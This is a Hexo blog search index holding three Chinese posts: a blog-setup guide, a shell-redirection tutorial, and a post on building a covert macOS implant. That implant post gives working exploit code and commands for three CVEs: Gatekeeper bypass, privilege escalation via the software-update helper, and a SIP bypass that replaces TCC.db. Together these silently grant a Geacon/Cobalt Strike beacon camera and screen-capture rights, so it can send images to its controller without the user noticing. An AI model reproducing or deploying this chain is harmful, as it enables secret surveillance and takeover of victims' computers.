<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>博客搭建</title>
    <link href="/2066/04/25/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2066/04/25/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="预准备"><a href="#预准备" class="headerlink" title="预准备"></a>预准备</h1><p>就是在电脑上安装一些所需的软件</p><ul><li><p>Git</p><p>根据不同的系统有不同的安装方式，可以根据自己的系统来，我这里是用Mac</p><p><code> brew install git </code></p></li><li><p>Node.js</p><p>也是有多种不同的方式，比如MacOS可以用homebrew</p><p><code> brew install node </code></p></li><li><p>Hexo</p><p>安装好Node.js后，使用下面指令来安装hexo</p><p><code> npm install -g hexo-cli </code></p><p>安装过程中可能会遇到网络问题，这时换下国内镜像源即可，下面是淘宝镜像</p><p><code> npm config set registry https://registry.npmmirror.com</code></p></li></ul><h1 id="初步使用Hexo"><a href="#初步使用Hexo" class="headerlink" title="初步使用Hexo"></a>初步使用Hexo</h1><ul><li><p>找一个位置创建我们的博客文件夹</p><p><code> mkdir Blog </code></p></li><li><p>进入Blog文件夹，使用hexo进行初始化</p><p><code> cd Blog </code></p><p><code> hexo init </code></p></li><li><p>这时已经初始化完成，可以使用下面指令测试一下</p><p><code> hexo s </code>打开server</p><p>在网页中http:&#x2F;&#x2F;localhost:4000进行访问，如果显示blog就正常</p></li><li><p>下载主题</p><p>正常如果是自己下载主题，需要将主题放在themes文件夹内</p><p>详情就是根据主题提供的方式来，这里我使用的是<a href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid主题</a>，所以使用npm安装<br><code> npm install --save hexo-theme-fluid</code><br>这样就会将hexo-theme-fluid安装到node_moudles文件夹内，当然还要同时创建一个对应主题的配置文件</p></li><li><p>配置主题<br>主要是_config.yml来掌控整个配置，比如选用哪个主题等等<br>具体主题还要有其对应的配置文件，比如这里是fluid的配置文件：_config.fluid.yml</p></li></ul><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="github的配置"><a href="#github的配置" class="headerlink" title="github的配置"></a>github的配置</h2><ul><li><p>创建一个githubPages仓库并进行相关设置</p></li><li><p>电脑端设置github的用户名和邮箱并生成rsa<br><code>git config --global user.name &quot;github用户名&quot;</code><br><code>git config --global user.email &quot;github注册的邮箱&quot;</code><br><code>ssh-keygen -t rsa -C &quot;github注册的邮箱&quot;</code>    </p></li><li><p>将本机生成的rsa设置到github仓库的上面<br><code>cat ~/.ssh/id_rsa.pub</code>将内容复制，进入github个人Settings中，SSH and GPG keys里面新建一个SSH keys粘贴进去即可</p></li><li><p>配置_config.yml，这里配置仓库链接时要注意使用ssh的形式，而不是https<br>在最下面添加:</p><blockquote></blockquote><pre><code class="hljs">deploy:        type: git        repository: 自己的仓库地址，选用ssh的那个        branch: main</code></pre></li></ul><h2 id="hexo生成相关的指令"><a href="#hexo生成相关的指令" class="headerlink" title="hexo生成相关的指令"></a>hexo生成相关的指令</h2><ul><li><p>如果之前存在生成的旧版本，先clean一下<br><code>hexo clean</code></p></li><li><p>先在Blog内进行生成<br><code>hexo g</code>是用来generate的，会对应生成一个public文件夹，一会是将该文件夹内的内容传至github</p></li><li><p>准备进行上传至github<br><code>hexo d</code>是用来deploy的，会根据_config.yml配置进行上传至github上面</p></li></ul><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>格式如下：</p><pre><code class="hljs">password: ******message: Pwn!!!</code></pre><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><pre><code class="hljs">#这个不显示图片参考：https://zhuanlan.zhihu.com/p/392900486?utm_id=0#解决：https://blog.csdn.net/McNeeley/article/details/131276010</code></pre><h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>个人</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>geacon_macos</title>
    <link href="/2023/11/25/geacon-macos/"/>
    <url>/2023/11/25/geacon-macos/</url>
    
    <content type="html"><![CDATA[<h1 id="三个CVE"><a href="#三个CVE" class="headerlink" title="三个CVE"></a>三个CVE</h1><ul><li><p>CVE-2022-22616<br>绕过GateKeeper<br>修复版本macOS12.3</p><blockquote></blockquote><pre><code class="hljs">mkdir -p poc.app/Contents/MacOSecho &quot;#!/bin/bash&quot; &gt; poc.app/Contents/MacOS/pocecho &quot;open -a Calculator&quot; &gt;&gt; poc.app/Contents/MacOS/pocchmod +x poc.app/Contents/MacOS/poczip -r poc.app.zip poc.appgzip -c poc.app.zip &gt; poc.app.zip.gz</code></pre></li><li><p>CVE-2022-22639<br>提权<br>修复版本macOS12.3</p><blockquote></blockquote><pre><code class="hljs">clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd解压 InstallAssistant.gz 到tmp文件夹run /tmp/exploit</code></pre><p>​    </p></li><li><p>CVE-2022-26712<br>绕过SIP<br>修复版本macOS12.4</p><blockquote></blockquote><pre><code class="hljs">sudo /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/shove -X /tmp/crafted.db /Library/Application\ Support/com.apple.TCC/TCC.db</code></pre></li></ul><h1 id="一-打包过程"><a href="#一-打包过程" class="headerlink" title="(一)打包过程"></a>(一)打包过程</h1><ol><li>首先是先将geacoon和相关代码进行编译</li><li>准备提权</li><li>准备替换TCC.db</li><li>将上面的步骤封装成一个app，并准备绕过gatekeeper</li></ol><ul><li>下面是整个App的构成，最终的效果是实现Geacon上线，并且能够正常执行Geacon中的相关功能；<br>我们的最终目的是想通过App让我们的Geacon上线，并且正常使用相关功能。所以在Geacon上线之前需要做一些前置工作（比如提权后绕过SIP操作TCC.db，先为我们的Geacon增加一下所需的权限），然后再启动Geacon。</li><li>主要构成</li><li>path<br>由于App可能会被放置到系统的各个位置，为了后面cp程序的正常执行，需要获取App当前所在的位置。因此，path程序做的事情就是获取当前App的位置，并且记录下来。</li><li>cp<br>该程序首先将提权程序elev执行所需的文件和环境构造好，然后启动提权程序</li><li>elev<br>该程序主要作用是以root权限执行一些命令，比如操作TCC.db的shove命令。效果就是在有root的权限基础上，进一步借助root权限执行shove，将系统原有的TCC.db替换掉，新的TCC.db中有我们Geacon程序所需的权限。</li><li>client<br>该程序就是Geacon程序，其中有截图、摄像头拍照功能，在截取屏幕内容和完成拍摄后是需要将图片回传至Cobalt Strike的。截图和调取摄像头都需要用户授予权限后才能使用，为了进一步隐蔽，上面通过借助提权程序和shove来为我们的Geacon程序提供预先设置好的权限。在前置工作完成的基础上，Geacon的功能是能够正常使用的，此时不会弹窗提示用户需要授权。这样Geacon程序是能够藏匿于目标系统中的。</li></ul><p><img src="/2023/11/25/geacon-macos/geacon_app_structure.png" alt="App构成"></p><p>下面这个结构就是自己添加的两个功能，一个是调取摄像头拍照，另一个是用于图片回传；</p><ul><li>关于图片回传的背景<br>之前Geacon里面的功能是面向Windows开发的，其中有些函数的用法并不适用MacOS，比如管道。在Windows下可以不用去了解图片的传输格式，但是在Mac中由于之前的功能不适用所以会导致传输图片失败，这样就必须去了解图片的发送格式，然后自己再手动构造一个包就行，这个用于构造传输图片的包的功能实现在ding模块里。</li></ul><p>这个源于一开始要实现截取屏幕内容并且回传，最初能截图但是图片却不能传回来，所以才进行了一个图片格式包的逆向。</p><ul><li>调取Macbook摄像头进行拍照<br>有了上面传输图片的基本功能后，可以进一步拓展。<br>当我们能调取摄像头进行拍照后，将其存为图片，继而可以将图片回传。</li></ul><p><img src="/2023/11/25/geacon-macos/geacon_func_structure.png" alt="功能构成"></p><h1 id="二-总体的大致实现流程"><a href="#二-总体的大致实现流程" class="headerlink" title="(二)总体的大致实现流程"></a>(二)总体的大致实现流程</h1><h2 id="App的可执行文件"><a href="#App的可执行文件" class="headerlink" title="App的可执行文件"></a>App的可执行文件</h2><p>下面代码做的事情：</p><ul><li>一个是将当前App路径记录下来，写进path文件里；</li><li>然后执行cp脚本</li><li>最后执行client程序</li></ul><blockquote><p>#import &lt;Foundation&#x2F;Foundation.h&gt;<br>    int main(int argc, const char * argv[]){</p></blockquote><pre><code class="hljs">    NSBundle *myBundle = [NSBundle mainBundle];    NSString *str = [myBundle bundlePath];//app path    NSString *path2file = [str stringByAppendingString:@&quot;/Contents/Resources/path&quot;];//write path to file    [str writeToFile:path2file atomically:TRUE encoding:NSUTF8StringEncoding error:nil];    NSString *str1 = [str stringByAppendingString:@&quot;/Contents/Resources/cp&quot;];//bash script path    NSLog(@&quot;%@&quot;,str);    NSTask *task = [[NSTask alloc] init];    NSArray *arguments = @[str];    [task setLaunchPath:str1];    [task setArguments:arguments];    [task launch];//run script    [task waitUntilExit];        NSTask *client = [[NSTask alloc] init];    [client setLaunchPath:@&quot;/tmp/client&quot;];    [client launch];    return 0;&#125;</code></pre><h2 id="cp脚本，用来准备执行提权程序"><a href="#cp脚本，用来准备执行提权程序" class="headerlink" title="cp脚本，用来准备执行提权程序"></a>cp脚本，用来准备执行提权程序</h2><p>下面的脚本是用来执行提权程序</p><blockquote></blockquote><pre><code class="hljs">#!/bin/bashpath1=$1path2=&quot;/Contents/Resources/InstallAssistant.gz&quot;path3=&quot;/Contents/Resources/elev&quot;path4=&quot;/Contents/Resources/Applications&quot;path5=&quot;/Contents/Resources/crafted.db&quot;path7=&quot;/Contents/Resources/client&quot;path=$&#123;path1&#125;$&#123;path2&#125;echo $&#123;path&#125;tar -xzvf $&#123;path&#125; -C $&#123;path1&#125;/Contents/Resources/echo &quot;decompress over&quot;mv -f $&#123;path1&#125;$&#123;path4&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path3&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path5&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path7&#125; /tmp/echo &quot;mv over&quot;/tmp/elev &amp;sleep 1</code></pre><h2 id="提权程序，可以将需要提权的代码执行放到这里执行"><a href="#提权程序，可以将需要提权的代码执行放到这里执行" class="headerlink" title="提权程序，可以将需要提权的代码执行放到这里执行"></a>提权程序，可以将需要提权的代码执行放到这里执行</h2><ul><li>提权程序的核心是在一个更新包的可执行程序中，可以是一个脚本；</li><li>下面做的是需要将执行的指令放到更新包的可执行程序中，以脚本的形式运行；</li><li>osinstallersetupd程序是以root的身份运行的，所以其中的指令也是以root的形式运行；</li><li>将需要root权限的指令写进去即可，比如下面是覆盖TCC.db</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">///  clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd</span><br><br><span class="hljs-meta">#import <span class="hljs-string">&lt;Foundation/Foundation.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">@protocol</span> <span class="hljs-title">SUHelperDProtocol</span></span><br><span class="hljs-comment">// some protocol methods</span><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-class"><span class="hljs-keyword">@interface</span> <span class="hljs-title">SUHelperProxy</span> : <span class="hljs-title">NSObject</span> &lt;<span class="hljs-title">SUHelperDProtocol</span>&gt;</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _suhelperd_port;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> _client_port;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> _currentRights;<br>    <span class="hljs-built_in">NSObject</span>&lt;OS_dispatch_queue&gt; *_q;<br>    <span class="hljs-built_in">NSObject</span>&lt;OS_dispatch_source&gt; *clientPortDeadChecker;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> _recentRights;<br>&#125;<br><br>+ (<span class="hljs-type">id</span>)sharedHelperProxy;<br><span class="hljs-keyword">@property</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> recentRights; <span class="hljs-comment">// @synthesize recentRights=_recentRights;</span><br>- (<span class="hljs-type">void</span>)authorizeWithEmptyAuthorizationForRights:(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)arg1;<br>- (<span class="hljs-type">BOOL</span>) prepareInstallAssistantWithPath:(<span class="hljs-built_in">NSString</span> *)arg1;<br>- (<span class="hljs-type">id</span>) installAssistantPreparationStatus;<br><br><span class="hljs-keyword">@end</span><br><br><span class="hljs-type">int</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-type">char</span> * argv[]) &#123;<br><br>    <span class="hljs-built_in">NSString</span> *modifyFile = <span class="hljs-string">@&quot;/tmp/Applications/Install macOS Monterey beta.app/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd&quot;</span>;<br>    <span class="hljs-built_in">NSString</span> *installAppPath = <span class="hljs-string">@&quot;/tmp/Applications/Install macOS Monterey beta.app&quot;</span>;<br>    <span class="hljs-built_in">NSString</span> *instr1 = <span class="hljs-string">@&quot;#!/bin/bash\nwhoami &amp;&gt; /Library/test_root\n&quot;</span>;<span class="hljs-comment">//Test root</span><br>    <span class="hljs-built_in">NSString</span> *instr2 = <span class="hljs-string">@&quot;/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/shove -X /tmp/crafted.db /Library/Application\\ Support/com.apple.TCC/TCC.db\n&quot;</span>;<span class="hljs-comment">//change tcc.db of system</span><br>    <br>    <span class="hljs-built_in">NSString</span> *instr = [instr1 stringByAppendingString:instr2];<span class="hljs-comment">//instr1 + instr2</span><br>    [instr writeToFile:modifyFile atomically:<span class="hljs-literal">TRUE</span> encoding:<span class="hljs-built_in">NSUTF8StringEncoding</span> error:<span class="hljs-literal">nil</span>];<br>    <br>    <span class="hljs-comment">// fire the hole</span><br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;all ready, we can go go go!&quot;</span>);<br>    <br>    SUHelperProxy *helper = [SUHelperProxy sharedHelperProxy];<br>    [helper authorizeWithEmptyAuthorizationForRights:<span class="hljs-number">4</span>];<br>    <br>    <span class="hljs-type">id</span> status = [helper installAssistantPreparationStatus];<br>    <span class="hljs-built_in">NSLog</span>(<span class="hljs-string">@&quot;installAssistantPreparationStatus:%@&quot;</span>, status);<br>    <span class="hljs-comment">// will hang inside, waiting for XPC response</span><br>    [helper prepareInstallAssistantWithPath:installAppPath];<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="client程序就是我们编译好的geacon"><a href="#client程序就是我们编译好的geacon" class="headerlink" title="client程序就是我们编译好的geacon"></a>client程序就是我们编译好的geacon</h2><ul><li>前面做的工作是为了client能够正常运行</li><li>当能够正常运行client时，该mac机器就能够正常上线</li><li>这部分主要就是除了geacon的基本功能，还额外实现了截图和打开摄像头拍照，并且可以将图片回传至CobaltStrike上面。</li></ul><h1 id="三-geacon和自拓展功能"><a href="#三-geacon和自拓展功能" class="headerlink" title="(三)geacon和自拓展功能"></a>(三)geacon和自拓展功能</h1><h2 id="geacon实现"><a href="#geacon实现" class="headerlink" title="geacon实现"></a>geacon实现</h2><p>这部分待补【目前放在网盘里】</p><h2 id="截图功能"><a href="#截图功能" class="headerlink" title="截图功能"></a>截图功能</h2><p>这部分工作要依赖上面提到的提权和绕过SIP。</p><ul><li><p>提权：是为了以root用户的身份去执行一些命令</p></li><li><p>绕过SIP：上面提到在特定系统版本范围内，shove命令可以直接操作TCC.db，但是这是需要root权限，所以配合提权就可以替换掉TCC.db文件</p></li><li><p>TCC.db：在Mac中应用可能会需要各种权限，在使用这些权限之前它需要先向系统申请授予权限，得到权限后才能进一步使用对应的功能。而记录每个程序权限控制就记录在TCC.db中</p></li></ul><p>这里我们是直接使用Mac自带的截图命令来截取当前的屏幕内容，如果程序没有被授予截屏权限将不能截取到屏幕的内容，而仅能截取到屏幕的背景，所以我们想要截取屏幕的内容需要先授予截屏权限。授予权限我们是通过更改TCC.db中的数据来更改权限的，是借助提权和绕过SIP两个漏洞来进行的，下面的摄像头功能同样是如此。</p><h2 id="关于图片回传"><a href="#关于图片回传" class="headerlink" title="关于图片回传"></a>关于图片回传</h2><p>这部分是将图片回传至CobaltStrike上，之前在Windows端的图片回传是通过管道获取数据的，在Mac上如果回传的格式不对CobaltStrike是无法正确解析的，所以下面Mac上的图片回传是通过调试Windows端的geacon来进一步获取回传的格式。</p><p>回传的格式如下:<br>图片内容长度(4Byte) + 图片内容 + id(4Byte) + 窗口名字的长度(4Byte) + 窗口名字 + 用户名字长度(4Byte) + 用户名字</p><p>将图片打包成正确的格式，我实现在ding.mm文件中</p><h2 id="摄像头拍照"><a href="#摄像头拍照" class="headerlink" title="摄像头拍照"></a>摄像头拍照</h2><p>摄像头拍照功能是通过包含bmain.h文件来调用的，打开摄像头并拍照放在一个单独的模块进行实现的。</p><p>该功能通过三个模块实现的：<br>VideoCapturer<br>MyDelegate<br>bmain</p>]]></content>
    
    
    <categories>
      
      <category>研究生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重定向</title>
    <link href="/2023/08/21/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <url>/2023/08/21/%E9%87%8D%E5%AE%9A%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>准备好好看下重定向得从下面这条语句说起：<br>-strace命令用于监控和记录程序执行时的系统调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">strace ./cast 2&gt;&amp;1 | grep -E &#x27;^write&#x27; | wc -l<br></code></pre></td></tr></table></figure><ul><li>   重定向描述符<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从输入和输出的角度看，<span class="hljs-built_in">cat</span>命令的输出的内容是其输入内容的直接复制</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span>命令后面可以跟文件名字来读取文件的内容并且输出，如果<span class="hljs-built_in">cat</span>后面没有文件名字则从标准输入中进行读取内容</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下面是从标准输入中读取内容，然后重定向输出到文件中，最后结束按ctrl + d</span><br>cat &gt; temp.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt; 是输入重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> &lt; filename，这样<span class="hljs-built_in">command</span>是从文件中读取而不是从标准输入读取</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面这条指令和 <span class="hljs-built_in">cat</span> filename.txt效果一样</span><br>cat &lt; filename.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;是输出重定向，指的是stdout重定向</span><br>ls &gt; test.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2&gt; 这是标准错误重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面将cast程序的错误输出保存到文件中</span><br>./cast 2&gt; errorOutput.txt<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&amp;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&amp;这是重定向操作符，将一个文件描述符重定向至另一个文件描述符</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如下面是将cast程序的错误输出和正常输出都输出到标准输出中，然后再将内容输出到文件中</span><br>./cast 2&gt;&amp;1 &gt; allOutput.txt<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"> # </span><span class="language-bash">| 管道符</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">管道符是将前面一个命令的标准输出作为后面一个命令的标准输入</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">cmd1 | cmd2</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;&lt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">输入重定向</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&lt;&lt; <span class="hljs-string">identifier, 这个效果就是创建一个Here Document，允许定义一个多行字符串，并且以identifier</span>为结束标志</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">比如 &lt;&lt; <span class="hljs-string">eof，这允许我们输入一个多行字符串最后以eof</span>为结束标志</span><br>&lt;&lt;eof<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">123</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">456</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">789</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">eof</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下面是结合<span class="hljs-built_in">cat</span>、&gt;、&lt;&lt;来实现从标准输入中读取，并且保存到文件中</span><br>cat &gt; temp.txt &lt;&lt;eof<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&gt;</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">&gt;&gt;输出重定向是用于追加内容</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">直接向一个文件尾部添加内容</span><br>echo &quot;sss&quot; &gt;&gt; temp.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash">直接从标准输入中读取内容并且追加到文件中</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">&gt; temp.txt &lt;&lt;<span class="hljs-string">eof</span></span><br><br><br><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
